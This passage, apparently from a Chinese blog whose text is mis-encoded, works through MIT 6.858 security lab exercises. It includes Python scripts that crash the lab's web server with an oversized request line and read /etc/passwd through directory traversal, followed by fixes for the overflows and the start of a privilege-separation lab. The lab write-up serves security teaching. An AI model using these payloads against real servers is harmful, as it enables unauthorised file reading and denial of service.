å³å¯</p><p><img src="https://s2.loli.net/2022/12/04/O5euynk9jE3GoH7.png" alt="image.png"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-libc</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡âˆš</p><p><img src="https://s2.loli.net/2022/12/04/ElDbUBFJ3rqatNW.png" alt="image.png"></p><p>ç„¶åæ˜¯ä¸€ä¸ª <em>Challenge</em> ï¼Œ<strong>åœ¨ä¸ä¾èµ– <code>accidentally()</code> å‡½æ•°çš„æƒ…å†µä¸‹æ„é€  ROP</strong>ï¼Œæç¤ºäº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ROPgadget æ¥å¯»æ‰¾ gadget ï¼š</p><blockquote><p><em>Challenge! (optional)</em> The <code>accidentally</code> function is a bit artificial. For extra credit, figure out how to perform the return-to-libc attack without relying on that function (delete it and find another way to make your exploit work). Provide your attack in <code>exploit-challenge.py</code>. Also, briefly explain the attack and provide ROP gadgets you use in <code>answers.txt</code>.</p><p>You will need to find another chunk of code to reuse that gives you control over <code>%rdi</code>. You can read through the disassembly (e.g. using <code>objdump</code>) to look for useful ROP gadgets.</p><p>Because of the nature of x86/x86-64, you can use another technique to find sequences of instructions that donâ€™t even appear in the disassembly! Instructions are variable-length (from 1 to 15 bytes), and by causing a misaligned parse (by jumping into the middle of an intended instruction), you can cause a sequence of machine code to be misinterpreted. For example, the instruction sequence <code>pop %r15; ret</code> corresponds to the machine code <code>41 5F C3</code>. But instead of executing from the start of this instruction stream, if you jump 1 byte in, the machine code <code>5F C3</code> corresponds to the assembly <code>pop %rdi; ret</code>.</p><p>Automated tools such as <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget.py</a> can assist you in searching for ROP gadgets, even finding gadgets that arise from misaligned parses. The 6.858 VM already has <code>ROPgadget</code> installed.</p><p>You may find it useful to search for ROP gadgets not just in the <code>zookd</code> binary but in other libraries that <code>zookd</code> loads at runtime. To see these libraries, and the addresses at which they are loaded, you can run <strong>( ulimit -s unlimited &amp;&amp; setarch -R ldd zookd-nxstack )</strong>. The <code>ulimit</code> and <code>setarch</code> commands set up the same environment used by <code>clean-env.sh</code>, so that <code>ldd</code> prints the same addresses that will be used at runtime.</p></blockquote><p>ç¬”è€…ä¸€å¼€å§‹çš„æ€è·¯å°±æ˜¯ä¸ç”¨  <code>accidentally()</code> ï¼ˆéå¸¸è«åå…¶å¦™çš„ä¸€ä¸ªå‡½æ•°ï¼‰ï¼Œæ‰€ä»¥ç­‰äºæ˜¯ç›´æ¥é€šè¿‡äº†ï¼ˆç¬‘ï¼‰</p><h2 id="Part-4-Fixing-buffer-overflows-and-other-bugs">Part 4: Fixing buffer overflows and other bugs</h2><p>è¿™ä¸€å—å°±æ˜¯ä¸¤ä¸ª Exerciseï¼Œ å…ˆçœ‹ Exercise 6ï¼Œè®©æˆ‘ä»¬å¯»æ‰¾ç¨‹åºä¸­çš„å…¶ä»–æ¼æ´ï¼ˆè‡³å°‘ä¸¤ä¸ªï¼Œé™¤äº† <code>zoobar</code> ä¸­çš„ä»¥å¤–ï¼Œé‚£ä¸ªæ˜¯ç•™ç»™æœªæ¥çš„å…¶ä»– labs çš„ï¼‰ï¼š</p><blockquote><p><strong>Exercise 6.</strong> Look through the source code and try to find more vulnerabilities that can allow an attacker to compromise the security of the web server. Describe the attacks you have found in <code>answers.txt</code>, along with an explanation of the limitations of the attack, what an attacker can accomplish, why it works, and how you might go about fixing or preventing it. You should ignore bugs in <code>zoobar</code>â€™s code. They will be addressed in future labs.</p><p>One approach for finding vulnerabilities is to trace the flow of inputs controlled by the attacker through the server code. At each point that the attackerâ€™s input is used, consider all the possible values the attacker might have provided at that point, and what the attacker can achieve in that manner.</p><p>You should find at least two vulnerabilities for this exercise.</p></blockquote><p><s>æºç å®¡è®¡è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œä½†æ˜¯</s>ç¬”è€…å®¡äº†å¤§åŠå¤©å¥½åƒä¹Ÿæ²¡æ‰¾åˆ°é™¤äº†ä¸Šé¢çš„ bug ä»¥å¤–çš„ bugï¼Œè¿˜å¥½åé¢è¿˜æ˜¯æ‰¾åˆ°äº†ä¸€äº›</p><p>é¦–å…ˆæ˜¯åœ¨ <code>process_client()</code> ä¸­å­˜å‚¨è¯·æ±‚ URL çš„é•¿åº¦çš„ä½ç½®å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œå› ä¸ºä¸€æ¬¡æœ€å¤šä¸€è¡Œè¯» 8192 å­—èŠ‚ï¼Œä½†è¿™é‡Œæ˜æ˜¾æ²¡æœ‰é¢„ç•™è¶³å¤Ÿçš„ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<span class="hljs-comment">// åªç•™äº†4096å­—èŠ‚</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span> <span class="hljs-comment">// è¿™é‡Œä¸€æ¬¡æœ€å¤šè¯» 8192 å­—èŠ‚</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br></code></pre></td></tr></table></figure><p>ç®€å•æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /&quot;</span> + <span class="hljs-string">b&quot;arttnba3&quot;</span> * <span class="hljs-number">768</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>æˆåŠŸ crashï¼Œä¸è¿‡è¿™é‡Œå¹¶éå› ä¸ºéæ³•è¿”å›åœ°å€ crashï¼Œè€Œæ˜¯å› ä¸ºæˆ‘ä»¬è¦†å†™æ‰äº†æ ˆä¸Šçš„ <code>errmsg</code> å˜é‡å¯¼è‡´éæ³•å†…å­˜å¼•ç”¨ä»è€Œ crash</p><p><img src="https://s2.loli.net/2022/12/04/t9vq36KXmZOIslJ.png" alt="image.png"></p><p>ç¬¬äºŒä¸ªæ¼æ´æ˜¯åœ¨ <code>http_serve</code> ä¸­å­˜åœ¨ç›®å½•ç©¿è¶Šçš„é—®é¢˜ï¼Œç”±äºæ²¡æœ‰å¯¹è·¯å¾„åšè¿‡æ»¤åŠåˆ¤æ–­ï¼Œè¿™å¯ä»¥è®©æˆ‘ä»¬è®¿é—®åˆ°æœåŠ¡å™¨æ ¹ç›®å½•å¤–çš„æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = http_serve_none;<br>    <span class="hljs-type">char</span> pn[<span class="hljs-number">2048</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><br>    getcwd(pn, <span class="hljs-keyword">sizeof</span>(pn));<br>    setenv(<span class="hljs-string">&quot;DOCUMENT_ROOT&quot;</span>, pn, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(name) + <span class="hljs-built_in">strlen</span>(pn) + <span class="hljs-number">1</span> &gt;= <span class="hljs-keyword">sizeof</span>(pn)) &#123;<br>        http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;Request too long&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">strncat</span>(pn, name, <span class="hljs-keyword">sizeof</span>(pn) - <span class="hljs-built_in">strlen</span>(pn) - <span class="hljs-number">1</span>);<br>    split_path(pn);<br><br>    <span class="hljs-keyword">if</span> (!stat(pn, &amp;st))<br>    &#123;<br>        <span class="hljs-comment">/* executable bits -- run as CGI script */</span><br>        <span class="hljs-keyword">if</span> (valid_cgi_script(&amp;st))<br>            handler = http_serve_executable;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (S_ISDIR(st.st_mode))<br>            handler = http_serve_directory;<br>        <span class="hljs-keyword">else</span><br>            handler = http_serve_file;<br>    &#125;<br><br>    handler(fd, pn);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">http_serve_file</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pn)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">if</span> ((filefd = open(pn, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;open %s: %s&quot;</span>, pn, strerror(errno));<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BSD</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (!fstat(filefd, &amp;st))<br>        len = st.st_size;<br>    <span class="hljs-keyword">if</span> (sendfile(fd, filefd, <span class="hljs-number">0</span>, len) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-keyword">if</span> (sendfile(filefd, fd, <span class="hljs-number">0</span>, &amp;len, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        err(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;sendfile&quot;</span>);<br>    close(filefd);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•å†™ä¸ªè„šæœ¬æµ‹è¯•ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET /../../../../etc/passwd&quot;</span> + <span class="hljs-string">b&quot; HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;REQUEST_URI: &quot;</span> + <span class="hljs-string">b&quot;index.html&quot;</span>  + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>æˆåŠŸè®¿é—®åˆ° <code>/etc/passwd</code></p><p><img src="https://s2.loli.net/2022/12/04/dlv6JVCk91QhcyW.png" alt="image.png"></p><p>Exercise 6 é‡Œè¯´ <code>You should find at least two vulnerabilities for this exercise.</code> ï¼Œç¬”è€…å·²ç»æ‰¾è¶³ä¸¤ä¸ªï¼Œæ»¡è¶³äº†é¢˜ç›®è¦æ±‚ï¼Œå°±ä¸ç»§ç»­æ‰¾æ›´å¤šçš„äº†ï¼ˆç¬‘ï¼‰<s>ğŸ‘´é€‰æ‹©ç›´æ¥æ‘†å¤§çƒ‚</s></p><p>æ¥ä¸‹æ¥çœ‹æœ€åä¸€ä¸ª Exerciseï¼Œè®©æˆ‘ä»¬è¿›è¡Œæ¼æ´ä¿®å¤ï¼Œä¸»è¦æ˜¯ä¿®æ‰¾åˆ°çš„æ ˆæº¢å‡ºæ¼æ´ï¼š</p><blockquote><p><strong>Exercise 7.</strong> For each buffer overflow vulnerability you have exploited in Exercises 2, 4, and 5, fix the web serverâ€™s code to prevent the vulnerability in the first place. Do not rely on compile-time or runtime mechanisms such as <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">stack canaries</a>, removing <code>-fno-stack-protector</code>, baggy bounds checking, etc.</p><p>Make sure that your code actually stops your exploits from working. Use <strong>make check-fixed</strong> to run your exploits against your modified source code (as opposed to the staff reference binaries from <code>bin.tar.gz</code>). These checks should report FAIL (i.e., exploit no longer works). If they report PASS, this means the exploit still works, and you did not correctly fix the vulnerability.</p><p>Note that your submission should <em>not</em> make changes to the <code>Makefile</code> and other grading scripts. We will use our unmodified version during grading.</p><p>You should also make sure your code still passes all tests using <strong>make check</strong>, which uses the unmodified lab binaries.</p></blockquote><p>ä¸»è¦æ˜¯ä¿®è¿™ä¸¤ä¸ªåœ°æ–¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> value[<span class="hljs-number">8192</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">8192</span>];<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼Œæ”»å‡»å…¨éƒ¨å¤±è´¥ä»£è¡¨æˆåŠŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-fixed</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸé€šè¿‡âˆš</p><p><img src="https://s2.loli.net/2022/12/04/6XNYjFW7BdPr1Re.png" alt="image.png"></p><p>è‡³æ­¤ï¼Œ Lab1 å…¨éƒ¨å®Œæˆ</p><h1>0x02.Lab 2: Privilege separation and server-side sandboxingï¼ˆuncompletedï¼‰</h1><h2 id="Introduction">Introduction</h2><p>è¿™ä¸€ä¸ª lab ä¸»è¦æ˜¯å…³äº <strong>æƒé™åˆ†ç¦»</strong> ï¼ˆprivilege separationï¼‰ä¸ <strong>æœåŠ¡å™¨ä¾§æ²™ç®±</strong>ï¼ˆserver-side sandboxingï¼‰ï¼Œè¿™ä¸€éƒ¨åˆ†æˆ‘ä»¬ä¸»è¦é€šè¿‡ä¸€ä¸ª MIT ç¼–å†™çš„åä¸º <code>zoobar</code> çš„ python web åº”ç”¨æ¥å®Œæˆï¼Œå…¶ä¸­æƒé™éš”ç¦»çš„ç›®çš„æ˜¯ä¿è¯æ”»å‡»è€…åœ¨ç ´åç¨‹åºçš„ä¸€éƒ¨åˆ†æ—¶ä¸ä¼šç ´ååˆ°ç¨‹åºçš„å¦ä¸€éƒ¨åˆ†ï¼Œè¯¥ lab å°†ä½¿ç”¨ <a href="https://linuxcontainers.org/">Linux containers</a> æ¥å®Œæˆ</p><blockquote><p>æ­¤å‰çš„ lab ä¸­ä½¿ç”¨çš„æ˜¯åœ¨è¯¾ä¸Šè®²è¿‡çš„ OKWS web serverï¼ˆ<s>ğŸ‘´æ²¡å¬è¯¾ï¼Œå¯„äº†</s>ï¼‰</p></blockquote><p>æœ¬ lab ä¸­æˆ‘ä»¬å°†å®Œæˆä¸€ä¸ªæƒé™éš”ç¦»çš„ web serverï¼Œæ£€æŸ¥çœ‹ä½ çš„æ¼æ´ï¼Œå¹¶å°†ç¨‹åºä»£ç åˆ†å‰²æˆéœ€è¦æ›´å°‘æƒé™çš„å†…å®¹å¿«ä»¥æœ€å°åŒ–å•ä¸ªæ¼æ´çš„å½±å“ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å°†æ‰©å±• Zoobar ä»¥ä½¿å…¶æ”¯æŒ  <em>å¯æ‰§è¡Œé…ç½®æ–‡ä»¶</em>  ï¼ˆexecutable profilesï¼‰ï¼Œè¿™å…è®¸æˆ‘ä»¬ä½¿ç”¨ python æ¥ä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œå¹¶å®Œæˆä¸åŒç”¨æˆ·é…ç½®æ–‡ä»¶çš„éš”ç¦»ï¼Œè¿™å…è®¸ç”¨æˆ·åœ¨å…¶é…ç½®æ–‡ä»¶ä¸­å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p><ul><li>ä¸€ä¸ªæŒ‰ç”¨æˆ·åæ¬¢è¿è®¿å®¢çš„ profile</li><li>ä¸€ä¸ªè®°å½•æœ€åå‡ ä½è®¿å®¢çš„ profile</li><li>ä¸€ä¸ªä¸ºæ¯ä½è®¿å®¢æä¾› zoobar çš„ profileï¼ˆé™åˆ¶ä¸ºæ¯åˆ†é’Ÿ1ä½ï¼‰</li></ul><p>è¿™éœ€è¦æ²™ç®±åŒ–æœåŠ¡å™¨ä¸Šçš„ profile code ä»è€Œé¿å…ä»»æ„ä»£ç æ‰§è¡Œæˆ–ä»»æ„æ–‡ä»¶è®¿é—®ï¼Œæ­¤å¤–ï¼Œè¿™äº›ä»£ç æˆ–è®¸éœ€è¦ä¿æŒè®°å½•ä¸€äº›æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œæˆ–æ˜¯è®¿é—® zoobar æ•°æ®åº“ä»¥æ­£ç¡®æ‰§è¡Œï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åä¸ºåº“çš„è¿œç¨‹è¿‡ç¨‹ä¸ lab æä¾›çš„ä¸€äº›ä»£ç æ¥æ²™ç®±åŒ–å¯æ‰§è¡Œé…ç½®æ–‡ä»¶</p><blockquote><p>å®éªŒæ‰‹å†ŒåŸæ–‡å°±æŒºä¹±ä¸ƒå…«ç³Ÿçš„ï¼ŒğŸ‘´æ„£æ˜¯æ²¡å’‹çœ‹æ˜ç™½ï¼Œ<s>ä¹Ÿå¯èƒ½æ˜¯ğŸ‘´çš„è‹±æ–‡æ°´å¹³å¤ªåƒåœ¾äº†</s></p></blockquote><p>é‚£ä¹ˆæ¥ä¸‹æ¥é¦–å…ˆè¿˜æ˜¯æŠŠä»£ç åˆ‡åˆ° lab2 çš„åˆ†æ”¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git add answers.txt exploit-*.py http.c zookd.c [and any other new files...]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&quot;lab1 solution completed&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab1</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯å…ˆ <code>make</code> æ£€æŸ¥ä¸€ä¸‹ï¼Œæ²¡æŠ¥é”™å°± ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookfs.o zookfs.c<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o http2.o http2.c<br>cc -m64  zookfs.o http2.o   -o zookfs<br>cc -m64 -g -std=c99 -Wall -Wno-format-overflow -D_GNU_SOURCE -static   -c -o zookd2.o zookd2.c<br>cc -m64  zookd2.o http2.o   -o zookd2<br></code></pre></td></tr></table></figure><h2 id="Prelude-Whatâ€™s-a-zoobar">Prelude: Whatâ€™s a zoobar?</h2><p>ä¸ºäº†ç†è§£ <code>zoobar</code>ï¼Œæˆ‘ä»¬é¦–å…ˆè¿‡ä¸€ä¸‹éƒ¨åˆ†æºç </p><p><code>zoobar</code> çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§æ˜¯å…è®¸åœ¨ç”¨æˆ·ä¹‹é—´ä¼ é€’å‡­è¯ï¼ˆcreditsï¼‰ï¼Œè¿™ç”± <code>transfer.py</code> å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥å¯åŠ¨ zoobar æ„Ÿå—ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./zookld.py</span><br></code></pre></td></tr></table></figure><p>è¿™ç©æ„éœ€è¦ python çš„ <code>lxc</code> æ¨¡å—æ‰èƒ½è·‘ï¼Œä½†æ˜¯ç¬”è€…æ€ä¹ˆéƒ½å®‰ä¸ä¸Šâ€¦<s>lab2 å°±æ­¤å®Œç»“</s></p><p>ç¬”è€…æœ€ç»ˆé€‰æ‹©  <em>æ”¾å¼ƒä½¿ç”¨è‡ªå·±æ­å»ºçš„å®éªŒç¯å¢ƒ</em>  ï¼Œé‡æ–°ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒç¯å¢ƒå»åšå®éªŒï¼Œä½†æ˜¯åœ¨æ‰§è¡Œ <code>./zookld.py</code> æ—¶åˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼š</p><p><img src="https://s2.loli.net/2022/12/07/E5rjcJBSFHQOifo.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™ä¸ªé—®é¢˜çš„å‡ºç°æ˜¯å› ä¸º <strong>Ubuntu 21.10 å·²ç»åœæ­¢æ›´æ–°</strong>ï¼Œæˆ‘ä»¬æ¥çœ‹ <code>zookld.py</code> çš„é€»è¾‘ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç›´æ¥è°ƒç”¨ <code>zookconf.py</code> é‡Œçš„ <code>boot()</code> å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zookconf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">2</span>:<br>        zookconf.boot(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">else</span>:<br>        zookconf.boot()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    zookconf.restart_with_cgroups()<br>    <span class="hljs-keyword">if</span> os.geteuid() == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;WARNING: Running zookld.py as root! In order to clean up &quot;</span><br>        <span class="hljs-string">&quot;containers from this run, you must run zookclean.py as root as well.&quot;</span>,<br>        file=sys.stderr)<br>    